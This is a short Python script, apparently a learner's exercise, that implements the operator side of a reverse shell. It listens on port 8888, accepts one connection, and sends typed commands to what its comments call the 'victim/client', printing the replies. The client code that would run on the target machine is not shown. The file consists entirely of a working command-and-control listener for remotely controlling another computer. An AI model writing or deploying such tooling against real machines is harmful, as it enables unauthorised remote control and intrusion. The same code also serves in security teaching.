import socket
import sys


# create a socket to connect two computers
def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 8888
        s = socket.socket()
    except socket.error as error_msg:
        print("socket creation error:" + str(error_msg))


# binding socket an listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("binding port:" + str(port))
        s.bind((host, port))
        s.listen(5)

    except socket.error as error_msg:
        print("socket binding error:" + str(error_msg) + "\n" + "retrying")
        bind_socket()


# establish connection with a client (socket must be listenning)
def socket_listen():
    conn, address = s.accept()
    print("connection has been established:", conn, "addres is ", address[0], "port:", address[1])
    send_command(conn)
    conn.close()


# send command to victim/client
def send_command(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        #     question: why this order
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_resp = str(conn.recv(1024), "utf-8")
            print(client_resp, end="")


def main():
    create_socket()
    bind_socket()
    socket_listen()


main()
